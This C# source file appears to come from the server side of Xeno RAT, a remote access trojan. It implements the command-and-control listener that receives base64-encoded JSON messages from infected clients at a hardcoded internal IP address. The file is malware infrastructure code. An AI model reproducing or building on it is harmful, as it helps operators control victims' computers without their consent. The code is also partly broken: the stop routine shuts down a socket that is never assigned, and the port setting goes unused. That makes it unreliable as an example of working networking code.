using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.NetworkInformation;
using System.IO;
using Newtonsoft.Json;

namespace xeno_rat_server
{
    class Listener
    {
        public Dictionary<int, _listener> listeners = new Dictionary<int, _listener>();
        private Func<byte[], Task> ConnectCallBack;

        public Listener(Func<byte[], Task> _ConnectCallBack)
        {
            ConnectCallBack = _ConnectCallBack;
        }

        public bool PortInUse(int port)
        {
            IPGlobalProperties ipProperties = IPGlobalProperties.GetIPGlobalProperties();
            IPEndPoint[] ipEndPoints = ipProperties.GetActiveTcpListeners();
            foreach (IPEndPoint endPoint in ipEndPoints)
            {
                if (endPoint.Port == port)
                {
                    return true;
                }
            }
            return false;
        }

        public void CreateListener(int port)
        {
            if (PortInUse(port))
            {
                MessageBox.Show("That port is currently in use!");
            }
            else
            {
                if (!listeners.ContainsKey(port))
                {
                    listeners[port] = new _listener(port);
                }
                try
                {
                    listeners[port].StartListening(ConnectCallBack);
                }
                catch
                {
                    listeners[port].StopListening();
                    MessageBox.Show("There was an error using this port!");
                }
            }

        }

        public void StopListener(int port)
        {
            listeners[port].StopListening();
        }
    }

    class _listener
    {
        private Socket listener;
        private int port;
        public bool listening=false;

        public _listener(int _port)
        {
            port = _port;
        }
        public int BytesToInt(byte[] data, int offset = 0)
        {
            if (BitConverter.IsLittleEndian)
            {
                return data[offset] | data[offset + 1] << 8 | data[offset + 2] << 16 | data[offset + 3] << 24;
            }
            else
            {
                return data[offset + 3] | data[offset + 2] << 8 | data[offset + 1] << 16 | data[offset] << 24;
            }
        }
        public byte[] IntToBytes(int data)
        {
            byte[] bytes = new byte[4];

            if (BitConverter.IsLittleEndian)
            {
                bytes[0] = (byte)data;
                bytes[1] = (byte)(data >> 8);
                bytes[2] = (byte)(data >> 16);
                bytes[3] = (byte)(data >> 24);
            }
            else
            {
                bytes[3] = (byte)data;
                bytes[2] = (byte)(data >> 8);
                bytes[1] = (byte)(data >> 16);
                bytes[0] = (byte)(data >> 24);
            }

            return bytes;
        }

        public async Task StartListening(Func<byte[], Task> connectCallBack)
        {
            // TODO修改IP
            string url = "http://172.20.240.1:8080/api/connect/";

            HttpListener listener;
            try
            {
                // 创建HttpListener实例
                listener = new HttpListener();
                listener.Prefixes.Add(url);
                // 启动监听器
                listener.Start();
            } catch(Exception e)
            {
                MessageBox.Show(e.Message, "Server.Listener.StartListening");
                return;
            }

            while (true)
            {
                try
                {
                    HttpListenerContext context = await listener.GetContextAsync();
                    HttpListenerRequest request = context.Request;
                    MessageBox.Show("Received request: " + request.HttpMethod + context.Request.ContentType,  "Server.Listener");
                    // 检查请求方法是否为POST
                    if (request.HttpMethod == "POST")
                    {
                        String contextType = context.Request.ContentType;
                        if (contextType.StartsWith("application/json"))
                        {
                            // 读取请求内容
                            using (Stream body = request.InputStream)
                            {
                                using (StreamReader reader = new StreamReader(body, context.Request.ContentEncoding))
                                {
                                    string requestBody = reader.ReadToEnd();
                                    dynamic json = JsonConvert.DeserializeObject(requestBody);
                                    string cmdType = json["type"].ToString();
                                    string dataBase64 = json["data"].ToString();
                                    byte[] dataBytes = Convert.FromBase64String(dataBase64);
                                    MessageBox.Show("Received POST request body: " + requestBody, "Server.Listener");
                                    if ("0".Equals(cmdType))
                                    {
                                        connectCallBack(dataBytes);
                                    }
                                    // 这里可以将 requestBody 反序列化为具体的对象进行处理
                                }

                                //using (MemoryStream ms = new MemoryStream())
                                //{
                                //    body.CopyTo(ms);
                                //    byte[] data = ms.ToArray();

                                //    int type = BytesToInt(data);
                                //    if (type == 0)
                                //    {
                                //        byte[] sockId = IntToBytes(1);
                                //        HttpListenerResponse response = context.Response;
                                //        response.ContentLength64 = data.Length;
                                //        Stream output = response.OutputStream;
                                //        await output.WriteAsync(data, 0, data.Length);
                                //        output.Close();
                                //        // 关闭连接
                                //        context.Response.Close();
                                //    }

                                //    // 处理请求数据
                                //    // 这里可以将 requestData 转换为具体的数据格式进行处理
                                //}
                            }
                        }
                    }
                } catch(Exception e)
                {
                    MessageBox.Show(e.Message, "Server.Listener.StartListening");
                }
            }

            //IPAddress ipAddress = IPAddress.Any;
            //IPEndPoint localEndPoint = new IPEndPoint(ipAddress, port);
            //listener = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

            //listener.Bind(localEndPoint);
            //listener.Listen(100);
            //listening = true;
            //while (true)
            //{
            //    try
            //    {
            //        Socket handler = await listener.AcceptAsync();
            //        MessageBox.Show("accepted", "Server.Listener.StartLitening");
            //        connectCallBack(handler);
            //    }
            //    catch (ObjectDisposedException)
            //    {
            //        break;
            //    }
            //    catch (Exception e)
            //    {
            //        Console.WriteLine(e.Message);
            //    }
            //}
        }

        public void StopListening()
        {
            listening= false;
            try { listener.Shutdown(SocketShutdown.Both); } catch { }
            try { listener.Close(); } catch { }
            try { listener.Dispose(); } catch { }
        }
    }
}
